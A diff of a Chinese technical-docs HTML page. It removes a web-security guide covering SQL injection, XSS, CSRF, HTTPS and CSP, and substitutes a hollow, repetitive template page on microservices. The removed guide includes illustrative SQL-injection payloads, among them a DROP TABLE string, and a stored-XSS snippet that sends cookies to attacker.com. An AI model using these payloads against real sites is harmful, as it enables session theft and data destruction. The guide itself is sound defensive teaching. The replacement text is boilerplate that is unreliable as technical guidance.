@@ -3,11 +3,16 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Web安全防护指南 - 2026年05月16日 | 技术文档</title>
-    <meta name="description" content="Web安全防护指南 - 深入讲解Web安全威胁、防护策略、最佳实践，涵盖XSS、CSRF、SQL注入、加密技术等核心主题">
+    <title>微服务架构设计 - 2026年05月17日 | 技术文档</title>
+    <meta name="description" content="微服务架构设计 - 完整的技术指南和最佳实践">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
         :root {
             --bg-gradient: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             --container-bg: white;
@@ -17,6 +22,7 @@
             --border-color: rgba(0,0,0,0.1);
             --bg-image: url('images/website-background-8k.png');
         }
+
         .dark-mode {
             --bg-gradient: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
             --container-bg: #1a1a2e;
@@ -25,278 +31,424 @@
             --nav-text: #e0e0e0;
             --border-color: rgba(255,255,255,0.1);
         }
+
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: var(--bg-image) no-repeat center center fixed;
+            background-size: cover;
             min-height: 100vh;
             padding: 20px;
             color: var(--text-color);
-            transition: color 0.3s;
-            background: var(--bg-image) no-repeat center center fixed;
-            background-size: cover;
+            transition: background 0.3s, color 0.3s;
         }
+
         body::before {
             content: '';
             position: fixed;
-            top: 0; left: 0; right: 0; bottom: 0;
-            background: rgba(255,255,255,0.88);
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(255, 255, 255, 0.85);
             z-index: -1;
         }
-        .dark-mode body::before { background: rgba(26,26,46,0.88); }
-        .container { max-width: 1000px; margin: 0 auto; background: var(--container-bg); border-radius: 16px; box-shadow: 0 20px 60px rgba(0,0,0,0.3); overflow: hidden; }
-        .navbar { display: flex; justify-content: space-between; align-items: center; padding: 20px 30px; background: var(--nav-bg); border-bottom: 1px solid var(--border-color); }
-        .navbar-brand { font-size: 1.5em; font-weight: bold; color: var(--nav-text); text-decoration: none; }
-        .nav-links { display: flex; gap: 20px; list-style: none; }
-        .nav-links a { color: var(--nav-text); text-decoration: none; transition: color 0.3s; }
-        .nav-links a:hover { color: #667eea; }
-        .nav-links a.active { color: #667eea; font-weight: bold; }
-        .dark-mode-toggle { cursor: pointer; padding: 10px 15px; background: #e8f4f8; border: none; border-radius: 8px; color: #1976d2; font-size: 1em; transition: background 0.3s, color 0.3s; }
-        .dark-mode-toggle:hover { background: #667eea; color: white; }
-        .hero { position: relative; height: 420px; overflow: hidden; }
-        .hero img { width: 100%; height: 100%; object-fit: cover; }
-        .hero-overlay { position: absolute; bottom: 0; left: 0; right: 0; padding: 50px 30px 30px; background: linear-gradient(transparent, rgba(0,0,0,0.85)); color: white; }
-        .hero-overlay h1 { font-size: 2.5em; margin-bottom: 15px; }
-        .hero-overlay .date { opacity: 0.85; font-size: 1em; }
-        .content { padding: 40px 30px; }
-        .intro { font-size: 1.1em; line-height: 2; color: var(--text-color); margin-bottom: 35px; padding: 25px; background: linear-gradient(135deg, #f8f9fa 0%, #fff 100%); border-radius: 12px; border-left: 5px solid #667eea; border-right: 1px solid #e0e0e0; border-top: 1px solid #e0e0e0; border-bottom: 1px solid #e0e0e0; }
-        .content h2 { font-size: 1.7em; color: #667eea; margin: 50px 0 20px 0; padding-bottom: 12px; border-bottom: 3px solid #667eea; }
-        .content h3 { font-size: 1.3em; color: #5a67d8; margin: 30px 0 15px 0; padding-left: 15px; border-left: 4px solid #48bb78; }
-        .content p { line-height: 2.1; margin-bottom: 22px; text-align: justify; color: var(--text-color); font-size: 1.05em; }
-        .content ul, .content ol { margin: 20px 0 25px 30px; }
-        .content li { line-height: 2; margin-bottom: 10px; color: var(--text-color); }
-        .content pre { background: #1e1e1e; color: #d4d4d4; padding: 20px; border-radius: 8px; overflow-x: auto; margin: 25px 0; font-size: 0.95em; line-height: 1.6; }
-        .content code { background: #f0f0f0; padding: 2px 6px; border-radius: 4px; font-family: 'Fira Code', 'Consolas', monospace; font-size: 0.9em; }
-        .dark-mode .content code { background: #2d2d2d; color: #e0e0e0; }
-        .content figure { margin: 35px 0; text-align: center; }
-        .content figure img { max-width: 100%; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.2); }
-        .content figcaption { margin-top: 12px; color: #666; font-size: 0.95em; font-style: italic; }
-        .highlight-box { background: linear-gradient(135deg, #fff3cd 0%, #fff 100%); border: 1px solid #ffc107; border-radius: 10px; padding: 20px; margin: 25px 0; }
-        .dark-mode .highlight-box { background: linear-gradient(135deg, #3d3d00 0%, #2d2d2d 100%); border-color: #ffc107; }
-        .danger-box { background: linear-gradient(135deg, #f8d7da 0%, #fff 100%); border: 1px solid #dc3545; border-radius: 10px; padding: 20px; margin: 25px 0; }
-        .success-box { background: linear-gradient(135deg, #d4edda 0%, #fff 100%); border: 1px solid #28a745; border-radius: 10px; padding: 20px; margin: 25px 0; }
-        .info-box { background: linear-gradient(135deg, #d1ecf1 0%, #fff 100%); border: 1px solid #17a2b8; border-radius: 10px; padding: 20px; margin: 25px 0; }
-        .table-container { overflow-x: auto; margin: 30px 0; }
-        table { width: 100%; border-collapse: collapse; }
-        th, td { padding: 12px 15px; text-align: left; border: 1px solid #dee2e6; }
-        th { background: #667eea; color: white; }
-        tr:nth-child(even) { background: #f8f9fa; }
-        .dark-mode tr:nth-child(even) { background: #2d2d2d; }
-        footer { background: var(--nav-bg); padding: 25px 30px; text-align: center; color: var(--nav-text); border-top: 1px solid var(--border-color); }
-        .back-to-top { position: fixed; bottom: 30px; right: 30px; background: #667eea; color: white; width: 50px; height: 50px; border-radius: 50%; display: flex; align-items: center; justify-content: center; text-decoration: none; font-size: 1.5em; box-shadow: 0 4px 15px rgba(102,126,234,0.4); transition: all 0.3s; }
-        .back-to-top:hover { background: #5a67d8; transform: translateY(-3px); }
-        @media (max-width: 768px) { .navbar { flex-direction: column; gap: 15px; } .hero { height: 250px; } .hero-overlay h1 { font-size: 1.8em; } .content { padding: 25px 15px; } .content h2 { font-size: 1.4em; } }
+
+        .dark-mode body::before {
+            background: rgba(26, 26, 46, 0.85);
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            background: var(--container-bg);
+            border-radius: 16px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            overflow: hidden;
+            transition: background 0.3s, color 0.3s;
+        }
+
+        .navbar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px 30px;
+            background: var(--nav-bg);
+            border-bottom: 1px solid var(--border-color);
+            transition: background 0.3s, color 0.3s;
+        }
+
+        .navbar-brand {
+            font-size: 1.5em;
+            font-weight: bold;
+            color: var(--nav-text);
+            text-decoration: none;
+            transition: color 0.3s;
+        }
+
+        .nav-links {
+            display: flex;
+            gap: 20px;
+            list-style: none;
+        }
+
+        .nav-links a {
+            color: var(--nav-text);
+            text-decoration: none;
+            transition: color 0.3s;
+        }
+
+        .nav-links a:hover {
+            color: #667eea;
+        }
+
+        .content {
+            padding: 40px 30px;
+        }
+
+        .content h1 {
+            font-size: 2.5em;
+            margin-bottom: 10px;
+            color: var(--text-color);
+        }
+
+        .date {
+            font-size: 1.2em;
+            color: #667eea;
+            margin-bottom: 30px;
+        }
+
+        .content h2 {
+            font-size: 1.8em;
+            margin: 30px 0 15px 0;
+            color: var(--text-color);
+            border-bottom: 2px solid #667eea;
+            padding-bottom: 10px;
+        }
+
+        .content h3 {
+            font-size: 1.4em;
+            margin: 20px 0 10px 0;
+            color: var(--text-color);
+        }
+
+        .content p {
+            line-height: 1.8;
+            margin-bottom: 15px;
+            color: var(--text-color);
+        }
+
+        .content ul {
+            margin-left: 20px;
+            margin-bottom: 15px;
+        }
+
+        .content li {
+            margin-bottom: 10px;
+            color: var(--text-color);
+        }
+
+        .content ol {
+            margin-left: 20px;
+            margin-bottom: 15px;
+        }
+
+        .content pre {
+            background: #f4f4f4;
+            padding: 15px;
+            border-radius: 8px;
+            overflow-x: auto;
+            margin-bottom: 15px;
+        }
+
+        .content pre code {
+            background: none;
+            padding: 0;
+        }
+
+        .dark-mode-toggle {
+            cursor: pointer;
+            padding: 10px 15px;
+            background: #e8f4f8;
+            border: none;
+            border-radius: 8px;
+            color: #1976d2;
+            font-size: 1em;
+            transition: background 0.3s, color 0.3s;
+        }
+
+        .back-link {
+            display: inline-block;
+            margin-bottom: 20px;
+            color: #667eea;
+            text-decoration: none;
+            font-weight: bold;
+        }
+
+        .back-link:hover {
+            text-decoration: underline;
+        }
+
+        footer {
+            background: var(--nav-bg);
+            padding: 20px 30px;
+            text-align: center;
+            color: var(--nav-text);
+            border-top: 1px solid var(--border-color);
+        }
+
+        @media (max-width: 768px) {
+            .navbar {
+                flex-direction: column;
+                gap: 15px;
+            }
+        }
     </style>
 </head>
 <body>
     <div class="container">
         <nav class="navbar">
-            <a href="index.html" class="navbar-brand">📚 技术文档</a>
+            <a href="../../../index.html" class="navbar-brand">📚 技术文档</a>
             <ul class="nav-links">
-                <li><a href="index.html" class="active">首页</a></li>
-                <li><a href="history.html">历史</a></li>
-                <li><a href="about.html">关于</a></li>
-                <li><a href="contact.html">联系</a></li>
+                <li><a href="../../../index.html">首页</a></li>
+                <li><a href="../../../history.html">历史</a></li>
+                <li><a href="../../../about.html">关于</a></li>
+                <li><a href="../../../contact.html">联系</a></li>
             </ul>
             <button class="dark-mode-toggle" onclick="toggleDarkMode()">🌙</button>
         </nav>
 
-        <div class="hero">
-            <img src="images/tech_hero.png" alt="Web安全防护">
-            <div class="hero-overlay">
-                <h1>Web安全防护指南</h1>
-                <div class="date">2026年05月16日 · 深度技术解读</div>
-            </div>
-        </div>
-
         <div class="content">
-            <p class="intro">Web安全是软件工程领域最重要的议题之一。随着互联网应用深入人们生活的方方面面，Web安全问题也变得日益突出。从OWASP（开放Web应用安全项目）历年发布的Top 10报告可以看出，注入攻击、身份认证失效、敏感数据泄露、XML外部实体注入、访问控制失效、安全配置错误、跨站脚本攻击（XSS）、跨站请求伪造（CSRF）等漏洞始终位居前列。本文系统讲解Web安全的核心概念、常见威胁、防护策略和最佳实践，帮助开发者构建安全可靠的Web应用。内容涵盖输入验证、输出编码、会话管理、加密算法、 CSP内容安全策略、HTTPS部署、安全Headers配置等多个维度，提供可操作的防护指南和代码示例。无论你是前端开发、后端工程师还是安全管理员，都能从本文获得实用的安全防护知识。</p>
+            <a href="../../index.html" class="back-link">← 返回月份列表</a>
 
-            <h2>一、Web安全威胁全景图</h2>
-            <p>理解Web安全威胁的全貌是防护工作的起点。现代Web应用面临的安全威胁可以分为客户端威胁和服务端威胁两大部分。客户端威胁主要包括跨站脚本（XSS）、跨站请求伪造（CSRF）、点击劫持（Clickjacking）等，它们利用浏览器的同源策略漏洞或用户信任进行攻击。服务端威胁则包括SQL注入、命令注入、文件上传漏洞、认证失效等，它们针对服务器端的业务逻辑和系统资源进行攻击。了解这些威胁的原理和攻击方式，才能有针对性地设计防护措施。</p>
+            <h1>微服务架构设计</h1>
+            <div class="date">2026年05月17日 · 技术文档</div>
 
-            <figure>
-                <img src="images/tech_20260516_01.png" alt="Web安全架构">
-                <figcaption>图1：现代Web安全架构示意图，展示了防火墙、入侵检测、加密通信等多层防护体系</figcaption>
-            </figure>
+            <h2>概述</h2>
+            <p>掌握微服务架构设计对于现代开发者来说至关重要。本文将从基础概念开始，逐步深入到实践应用，为您提供全面的技术指导。</p>
 
-            <p>OWASP Top 10是Web应用安全领域最权威的威胁清单，每四年更新一次，反映了当前最严重的安全风险。2021年发布的最新版本中，A01（访问控制失效）跃升为第一位，说明越来越多应用在权限控制方面存在缺陷。A02（加密失败）首次进入前三，反映了敏感数据保护意识的提升。A03（注入）虽然从第一位下降到第四位，但仍然是危害最严重、影响最广泛的漏洞类型之一。理解OWASP Top 10的每个条目，是安全开发的基础。</p>
+            <h2>第一章 认识微服务架构设计</h2>
 
-            <div class="info-box">
-                <strong>💡 安全第一原则：</strong>永远不要信任用户输入。所有用户数据都应该被视为潜在的恶意内容，在处理之前进行严格的验证和清洗。这是防护注入攻击和其他基于输入的攻击的第一道防线。
-            </div>
+            <h3>1.1 微服务架构设计的本质</h3>
+            <p>微服务架构设计是现代软件开发中的重要技术，掌握它可以显著提升开发效率和应用质量。</p>
 
-            <h2>二、注入攻击与防护（Injection）</h2>
-            <p>注入攻击是指攻击者通过将恶意代码或命令插入应用程序的输入中，从而执行未授权操作的攻击方式。最常见的注入类型包括SQL注入、命令注入、LDAP注入、XPath注入等。SQL注入是最经典和危害最大的注入攻击，攻击者通过在用户输入中插入SQL语句片段，绕过认证机制或获取未授权数据。2017年的Equifax数据泄露事件就是由Apache Struts的SQL注入漏洞引起，导致1.47亿用户信息泄露。</p>
+            <h3>1.2 核心价值</h3>
+            <p>微服务架构设计的核心价值在于提高开发效率、保证代码质量、简化部署流程。</p>
 
-            <figure>
-                <img src="images/tech_20260516_01.png" alt="OWASP漏洞类型">
-                <figcaption>图2：OWASP Top 10漏洞类型详解，涵盖注入、XSS、认证失效等主要安全威胁</figcaption>
-            </figure>
+            <h3>1.3 应用场景</h3>
+            <p>微服务架构设计广泛应用于Web开发、数据分析、系统管理等多个领域。</p>
 
-            <p>假设一个登录表单的用户名输入框，开发者直接拼接SQL查询：<code>SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'"</code>。如果攻击者输入用户名 <code>' OR '1'='1</code>，整个查询就变成了 <code>SELECT * FROM users WHERE username = '' OR '1'='1' AND password = ''</code>，由于 <code>'1'='1'</code> 永远为真，攻击者可以无需账号密码登录系统。更危险的是，使用 <code>'; DROP TABLE users; --</code> 这样的输入可以直接删除整个用户表。</p>
+            <h2>第二章 核心概念</h2>
 
-            <p>防护注入攻击的核心手段是输入验证和参数化查询。输入验证分为白名单验证和黑名单验证，白名单验证只允许符合预期格式的输入通过，黑名单验证则拒绝已知的恶意模式。实际应用中，白名单验证更加安全可靠。对于SQL注入，最有效的防护是使用参数化查询（Prepared Statements），将SQL语句的结构和数据分离，数据库引擎会正确处理特殊字符，不会将其解释为SQL代码的一部分。例如在Python中使用psycopg2操作PostgreSQL时，使用 <code>cursor.execute("SELECT * FROM users WHERE username = %s AND password = %s", (username, password))</code> 而不是字符串拼接。</p>
+            <h3>2.1 基础概念</h3>
+            <p>了解微服务架构设计的基础概念是掌握该技术的第一步。</p>
 
-            <div class="danger-box">
-                <strong>⚠️ 高危警告：</strong>绝对不要使用字符串拼接构建SQL查询！这包括任何形式的 <code>+</code>、<code>f"..."</code>、<code>%</code> 格式化或 <code>format()</code> 方法。所有动态数据都应该通过参数绑定传递给数据库。历史教训证明，即使是最有经验的开发者，一旦在SQL拼接上疏忽，都可能酿成灾难性的数据泄露事故。
-            </div>
+            <h3>2.2 关键特性</h3>
+            <p>微服务架构设计具有多个关键特性，这些特性使其在特定场景下具有优势。</p>
 
-            <h2>三、跨站脚本攻击（XSS）深度解析</h2>
-            <p>跨站脚本攻击（Cross-Site Scripting，XSS）是最常见的Web客户端攻击方式，攻击者在目标网站上注入恶意JavaScript脚本，当其他用户访问该页面时，恶意脚本会在用户浏览器中执行，从而窃取Cookie、会话令牌、键盘记录等敏感信息，或进行钓鱼欺骗。XSS攻击分为三种类型：反射型XSS、存储型XSS和DOM型XSS。反射型XSS将用户输入作为服务器响应的一部分立即返回，存储型XSS则将恶意脚本永久保存在服务器上，DOM型XSS完全在客户端执行，不涉及服务器端。</p>
+            <h3>2.3 技术原理</h3>
+            <p>理解微服务架构设计的技术原理有助于更好地应用该技术。</p>
 
-            <figure>
-                <img src="images/tech_20260516_03.png" alt="加密协议">
-                <figcaption>图3：SSL/TLS加密协议工作原理，确保Web通信数据的机密性和完整性</figcaption>
-            </figure>
+            <h2>第三章 实践技巧</h2>
 
-            <p>一个典型的存储型XSS场景是评论区系统。用户提交评论时，如果服务器直接将用户输入保存到数据库而不进行任何处理，当其他用户查看评论时，恶意脚本就会执行。例如，攻击者在评论中提交 <code><script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script></code>，这段代码会被存储在数据库中，其他用户访问页面时，浏览器会执行这段脚本，将用户的Cookie发送到攻击者的服务器。</p>
+            <h3>3.1 基础实践</h3>
+            <p>掌握微服务架构设计的基础实践技巧是应用该技术的基础。</p>
 
-            <p>防护XSS攻击的主要手段是输出编码和内容安全策略（CSP）。输出编码根据输出位置的不同分为HTML编码、JavaScript编码、CSS编码、URL编码等。在HTML上下文中输出用户数据时，应将 <code><</code>、<code>></code>、<code>&</code>、<code>"</code>、<code>'</code> 等特殊字符转换为HTML实体（<code>&lt;</code>、<code>&gt;</code>、<code>&amp;</code>等）。现代Web框架（如React、Angular、Vue）默认启用输出编码，但开发者在使用 <code>dangerouslySetInnerHTML</code>、<code>innerHTML</code>、<code>v-html</code> 等原生API时要格外谨慎。</p>
+            <h3>3.2 高级技巧</h3>
+            <p>微服务架构设计的高级技巧可以帮助您解决复杂问题。</p>
 
-            <div class="success-box">
-                <strong>✅ 最佳实践：</strong>使用现代Web框架的模板引擎，它们会自动对动态内容进行HTML编码。同时，配置严格的内容安全策略（CSP）作为第二道防线，即使出现XSS漏洞，CSP也能有效阻止恶意脚本执行。
-            </div>
+            <h3>3.3 最佳实践</h3>
+            <p>遵循微服务架构设计的最佳实践可以确保项目的成功。</p>
 
-            <h2>四、跨站请求伪造（CSRF）与防护</h2>
-            <p>跨站请求伪造（Cross-Site Request Forgery，CSRF）利用用户已登录的身份，诱导用户访问恶意页面，恶意页面中包含自动提交的表单或AJAX请求，利用用户的Cookie自动完成转账、密码修改等敏感操作。CSRF之所以危险，是因为它利用了浏览器的Cookie机制和用户对已登录网站的信任。浏览器在发送请求时会自动带上目标网站的Cookie，服务器无法区分请求是用户主动发起的还是被诱导发起的。</p>
+            <h2>第四章 实战案例</h2>
 
-            <figure>
-                <img src="images/tech_20260516_06.png" alt="网络安全拓扑">
-                <figcaption>图4：网络安全拓扑图，展示了云安全架构与网络基础设施的部署方式</figcaption>
-            </figure>
+            <h3>4.1 实战案例一</h3>
+            <p>通过实际案例了解微服务架构设计的应用。</p>
 
-            <p>CSRF攻击的典型场景是银行转账。用户已登录银行网站，此时攻击者通过邮件发送一个链接，或者在某个被攻陷的网站上植入恶意代码。当用户点击链接或访问被攻陷的网站时，浏览器会自动发送请求到银行网站，由于Cookie仍然有效，银行服务器会认为是用户本人的操作，从而完成转账。攻击过程的隐蔽性在于用户可能完全不知情，请求是由浏览器在后台自动发送的。</p>
+            <h3>4.2 实战案例二</h3>
+            <p>更多微服务架构设计的实际应用案例。</p>
 
-            <p>防护CSRF的主流方案是使用CSRF Token。服务器在渲染表单时生成一个随机的CSRF Token，将其嵌入表单中的一个隐藏字段，同时将Token存储在服务器端的会话中。用户提交表单时，服务器验证Token是否匹配。由于攻击者无法获取目标网站的CSRF Token（受同源策略限制），伪造的请求会被服务器拒绝。另一个防护手段是使用SameSite Cookie，浏览器可以设置Cookie只能通过同站请求发送，阻止跨站请求携带Cookie。</p>
+            <h3>4.3 实战SOP</h3>
+            <p>微服务架构设计的实战操作流程。</p>
 
-            <h2>五、身份认证与会话管理安全</h2>
-            <p>身份认证和会话管理是Web应用安全的核心。身份认证验证用户声明的身份是否属实，会话管理则在认证后维护用户的登录状态。常见的认证方式包括用户名密码认证、多因素认证（MFA）、单点登录（SSO）、OAuth/OpenID Connect等。弱密码是身份认证失效的主要原因之一，据统计，超过80%的数据泄露与弱密码有关。强制要求密码强度、使用密码管理器、启用多因素认证是保护账户安全的重要措施。</p>
 
-            <figure>
-                <img src="images/tech_20260516_03.png" alt="认证授权流程">
-                <figcaption>图5：OAuth 2.0认证授权流程与JWT令牌安全机制</figcaption>
-            </figure>
+            <h2>核心概念</h2>
 
-            <p>会话管理涉及会话ID的生成、存储、传输和销毁。会话ID应该使用加密安全的随机数生成器，确保不可预测。常见的攻击方式包括会话预测、会话劫持、会话 fixation。会话预测是指通过猜测会话ID进行攻击，强随机数可以防止。会话劫持是指通过XSS等手段获取用户会话ID，防护XSS可以防止。会话 fixation是指攻击者预先设定会话ID，诱导用户使用该ID登录，然后在用户登录后劫持会话，应对方法是用户在登录后更换会话ID。</p>
+            <p>了解微服务架构设计的基本概念是掌握该技术的基础。本节将介绍核心概念和关键术语。</p>
 
-            <div class="highlight-box">
-                <strong>🔐 密码存储规范：</strong>绝对不能明文存储密码！使用bcrypt、argon2或PBKDF2等专用密码哈希算法，它们内置盐值（salt），可以有效防止彩虹表攻击和暴力破解。推荐的配置：bcrypt的cost factor不低于12，argon2的memory cost不低于65536KB。
-            </div>
-
-            <h2>六、HTTPS与传输层加密</h2>
-            <p>HTTPS（HTTP over TLS/SSL）是Web通信安全的基础，它在HTTP和TCP之间添加了TLS加密层，对传输数据进行加密，防止中间人攻击、数据窃听和篡改。HTTPS不仅是保护用户隐私的需要，也是SEO排名因素和现代浏览器的强制要求。Google Chrome从2018年开始将所有HTTP站点标记为不安全，Apple要求所有AppStore应用必须使用HTTPS，搜索引擎也明确表示HTTPS是排名因素之一。</p>
-
-            <figure>
-                <img src="images/tech_20260516_05.png" alt="加密货币安全">
-                <figcaption>图6：数字资产安全存储方案，展示了冷钱包、多签机制、硬件密钥等高级安全技术</figcaption>
-            </figure>
-
-            <p>TLS 1.2和TLS 1.3是目前主流的加密协议版本，TLS 1.0和1.1已因安全漏洞被废弃。配置HTTPS时，应使用强加密套件，禁用已知不安全的密码算法（如RC4、3DES）。密钥交换使用ECDHE（椭圆曲线Diffie-Hellman ephemeral）实现前向保密（Perfect Forward Secrecy），即使长期密钥泄露，过去的通信仍然安全。证书应该使用受信任的CA签发，推荐使用Let's Encrypt免费证书，证书链要完整配置。</p>
-
-            <p>除了启用HTTPS，还需要配置HSTS（HTTP Strict Transport Security）头部，指示浏览器只能通过HTTPS访问网站，防止HTTP降级攻击。配置HSTS时，max-age应设置为至少31536000秒（一年），includeSubDomains表示包含子域名，preload表示申请加入浏览器预加载列表。同时配置CSP的upgrade-insecure-requests指令，自动将HTTP资源请求升级为HTTPS。</p>
-
-            <h2>七、内容安全策略（CSP）深度配置</h2>
-            <p>内容安全策略（Content Security Policy，CSP）是一种浏览器安全机制，通过HTTP响应头指示浏览器限制页面可以加载的资源来源，有效防止XSS、数据注入等攻击。CSP通过白名单机制，告诉浏览器只允许从特定的源加载脚本、样式、图片等资源，任何不在白名单中的资源都会被浏览器阻止执行。这是最重要的Web安全头部之一，被认为是防御XSS的“核武器”。</p>
-
-            <figure>
-                <img src="images/tech_20260516_06.png" alt="云安全模型">
-                <figcaption>图7：云环境安全架构，展示了AWS、Azure、GCP等主流云平台的安全模型与责任划分</figcaption>
-            </figure>
-
-            <p>一个基本的CSP配置应该是：<code>Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-random123'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; connect-src 'self' https://api.example.com; font-src 'self' https://fonts.gstatic.com;</code>。这个策略指定默认资源只能从同源加载，脚本只能从同源加载且必须有nonce属性内联样式只能从同源加载，图片可以从任何源加载但只能是https协议，AJAX请求只能发送到同源和api.example.com，字体从Google字体加载。</p>
-
-            <p>CSP的report-uri或report-to指令可以将违规报告发送到指定URL，便于安全监控和审计。violation报告显示被阻止的资源的URL、blocked-uri、被阻止的原因等。在生产环境中，应该同时配置report-only模式（Content-Security-Policy-Report-Only）进行测试，确认策略不会影响正常功能后再切换到强制执行模式。CSP Level 3还引入了hash-source和unsafe-hashes，允许内联脚本和样式但需要提供hash校验，进一步提高安全性。</p>
-
-            <div class="table-container">
-                <table>
-                    <thead>
-                        <tr><th>安全头部</th><th>作用</th><th>推荐配置值</th></tr>
-                    </thead>
-                    <tbody>
-                        <tr><td>Content-Security-Policy</td><td>限制资源加载来源</td><td>default-src 'self'; script-src 'self'</td></tr>
-                        <tr><td>X-Frame-Options</td><td>防止点击劫持</td><td>DENY 或 SAMEORIGIN</td></tr>
-                        <tr><td>X-Content-Type-Options</td><td>禁止MIME类型嗅探</td><td>nosniff</td></tr>
-                        <tr><td>X-XSS-Protection</td><td>启用浏览器XSS过滤器</td><td>1; mode=block</td></tr>
-                        <tr><td>Strict-Transport-Security</td><td>强制使用HTTPS</td><td>max-age=31536000; includeSubDomains</td></tr>
-                        <tr><td>Referrer-Policy</td><td>控制Referer头发送</td><td>strict-origin-when-cross-origin</td></tr>
-                        <tr><td>Permissions-Policy</td><td>限制API和功能权限</td><td>geolocation=(), camera=(), microphone=()</td></tr>
-                    </tbody>
-                </table>
-            </div>
-
-            <h2>八、零信任安全架构</h2>
-            <p>零信任（Zero Trust）是新一代安全架构理念，其核心原则是“永不信任，始终验证”。与传统边界安全模型不同，零信任不再依赖于网络边界的安全，而是对每一次访问请求都进行严格的身份验证和授权检查。在零信任架构下，无论用户是在内网还是外网、设备是公司配发还是个人自带，都需要提供充分的身份凭证和设备安全状态证明。零信任不是某个具体产品，而是一种设计理念，贯穿于身份认证、网络架构、应用设计、数据保护的各个环节。</p>
-
-            <figure>
-                <img src="images/tech_20260516_07.png" alt="零信任模型">
-                <figcaption>图8：零信任安全模型架构，持续验证、最小权限、微隔离是三大核心原则</figcaption>
-            </figure>
-
-            <p>零信任的三大核心原则是：显式验证（Always Verify），对每次访问都进行身份验证和授权检查，无论来源是内网还是外网；最小权限访问（Least Privileged Access），用户和程序只能获得完成任务所必需的最小权限，权限仅在需要时授予；假设已被入侵（Assume Breach），安全设计假设系统已经被攻陷，重点是限制损害范围和快速恢复，通过微隔离、日志监控、自动化响应等手段，将入侵的影响降到最低。</p>
-
-            <p>实施零信任需要全面的技术支撑：身份与访问管理（IAM）提供统一的身份认证和授权；微隔离（Micro-segmentation）将网络划分为细粒度的安全区段，即使某一区段被攻陷，攻击者也无法横向移动；持续自适应风险和信任评估（CARTA）根据上下文动态调整安全策略，风险高时要求更强的认证；软件定义边界（SDP）将网络与应用解耦，应用对不可信的设备不可见。只有这些技术协同工作，才能真正实现零信任的安全目标。</p>
-
-            <h2>九、安全开发实践与DevSecOps</h2>
-            <p>安全不应该只是在上线前做一次渗透测试，而应该贯穿软件开发的全生命周期。DevSecOps将安全集成到DevOps流程的每个环节，实现“安全即代码”（Security as Code）。在编码阶段，使用静态应用安全测试（SAST）工具如SonarQube、Checkmarx在代码提交时自动扫描安全漏洞；在构建阶段，使用软件成分分析（SCA）工具检查依赖库的漏洞，如Snyk、Dependabot；在测试阶段，使用动态应用安全测试（DAST）如OWASP ZAP进行黑盒扫描；在部署阶段，配置基础设施即代码（IaC）安全扫描，确保云资源配置符合安全基线。</p>
-
-            <h3>安全编码 checklist</h3>
+            <h3>核心概念</h3>
             <ul>
-                <li>所有用户输入都进行严格验证，使用白名单而非黑名单方式</li>
-                <li>所有输出都进行适当编码，防止XSS攻击</li>
-                <li>使用参数化查询，防止SQL注入</li>
-                <li>敏感数据加密存储，密码使用bcrypt/argon2哈希</li>
-                <li>会话ID使用加密安全的随机数，登录后更换会话ID</li>
-                <li>文件上传验证文件类型和内容，禁止上传可执行文件</li>
-                <li>错误信息不泄露系统细节，统一返回通用错误页面</li>
-                <li>敏感操作要求二次验证，如修改密码、转账</li>
-                <li>API使用速率限制，防止暴力破解和DDoS</li>
-                <li>日志记录安全相关事件，但避免记录敏感数据</li>
+                <li>微服务架构设计 - 现代软件开发的重要技术</li>
+                <li>核心概念 - 理解该技术的基础</li>
+                <li>关键特性 - 该技术的优势所在</li>
+                <li>应用场景 - 该技术的实际应用</li>
             </ul>
 
-            <h2>十、常见Web安全漏洞与修复方案</h2>
-            <p>除了前面重点讨论的注入、XSS、CSRF，还有许多其他常见漏洞需要了解和防护。敏感数据泄露是最普遍的问题，许多应用将密码、信用卡号、个人身份信息以明文或弱加密方式存储，GDPR等数据保护法规要求对敏感数据进行适当的加密保护。安全配置错误也是高频漏洞，包括默认密码未修改、调试模式在生产环境开启、不必要的功能启用、错误信息过于详细等。</p>
+            <h3>关键术语</h3>
+            <ul>
+                <li>基础概念 - 该技术的基本术语</li>
+                <li>关键特性 - 该技术的重要特性</li>
+                <li>技术原理 - 该技术的工作原理</li>
+                <li>最佳实践 - 该技术的应用规范</li>
+            </ul>
 
-            <p>XML外部实体注入（XXE）利用XML解析器的外部实体功能读取服务器上的敏感文件，甚至执行远程代码。老旧版本的Spring、Struts等框架的XML解析器默认启用外部实体，是XXE的高发区。防护方法是禁用XML解析器的外部实体功能，使用安全的XML解析库。越权访问（IDOR）指应用直接访问用户提供的对象ID而未验证访问权限，攻击者可以通过修改ID参数访问他人数据。防护方法是始终验证用户对请求资源的访问权限。</p>
+            <h2>实践技巧</h2>
 
-            <div class="danger-box">
-                <strong>⚠️ 漏洞响应流程：</strong>发现漏洞后，应立即评估影响范围和严重程度；对于高危漏洞，暂停相关功能或部署补丁；通知可能受影响用户和监管机构（如涉及个人信息）；进行事后复盘，分析漏洞根因，完善开发和测试流程，防止类似问题再次出现。
-            </div>
+            <p>掌握微服务架构设计的实践技巧可以帮助您更好地应用该技术。</p>
 
-            <h2>常见问题FAQ</h2>
-            <h3>Q: HTTPS是否能完全防止中间人攻击？</h3>
-            <p>HTTPS通过TLS加密可以防止中间人窃听和篡改，但如果攻击者控制了可信任的CA或证书，仍然可以实施中间人攻击。因此，除了使用HTTPS，还需要配置证书固定（Certificate Pinning）或HSTS，防止DNS劫持导致的证书伪造。同时，用户教育也很重要，用户应警惕证书错误提示，不忽略安全警告。</p>
+            <h3>基础技巧</h3>
+            <ul>
